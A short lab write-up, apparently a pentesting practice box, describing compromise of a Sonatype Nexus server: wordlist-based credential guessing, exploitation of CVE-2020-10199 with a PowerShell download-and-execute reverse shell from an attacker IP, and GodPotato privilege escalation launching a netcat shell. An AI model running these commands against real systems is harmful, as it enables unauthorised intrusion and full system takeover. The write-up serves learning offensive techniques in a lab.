#box

*Created: 2/2/2026*

### Step 1

**Tags:** #cewl #Credential-Hunting #Credential-Guessing #Hydra #hydra-http-post-form

**Command:**
```bash
cewl --lowercase http://192.168.165.61:8081/ > wordlist.txt
```

*Port: 8081 | 💎 GEM*

> 
> On port 8081 an instance of Sonatype Nexus Repository Manager is hosted. After some research, default credentials doesn't work but apparently using `cewl` helps us find out the credentials being `nexus:nexus`

---

### Step 2

**Tags:** #RCE #Sonatype-NRM #Invoke-ConPtyShell #Reverse-Shell

**Command:**
```bash
# This below is just part of the snippet. The one we modified to make the script work as intended.

URL='http://192.168.165.61:8081'
CMD='powershell IEX(IWR http://192.168.45.193:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.193 -RemotePort 8081 -Rows 63 -Cols 315'
USERNAME='nexus'
PASSWORD='nexus'
```

*Port: 8081 | 💎 GEM*

> 
> Once authenticated, we discover that the current version of Sonatype Nexus Repository Manager 3.21.0-05 is suffering from the following vulnerability [CVE-2020-10199](https://www.exploit-db.com/exploits/49385). After downloading it, we craft a malicious payload with `Invoke-ConPtyShell.ps1` to gain a stable shell on our end.

---

### Step 3

**Tags:** #Reverse-Shell #GodPotato #SeImpersonatePrivilege

**Command:**
```bash
.\GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.193 8081"
```

> 
> Once landed on the target machine we realize our use has `SeImpersonatePrivilege`. After trying with `PrintSpoofer64` we realize that we're unable to gain a shell with it. We then opt to try different potatoes and finally succeed t gain a shell as root with `GodPotato-NET4.exe`

---

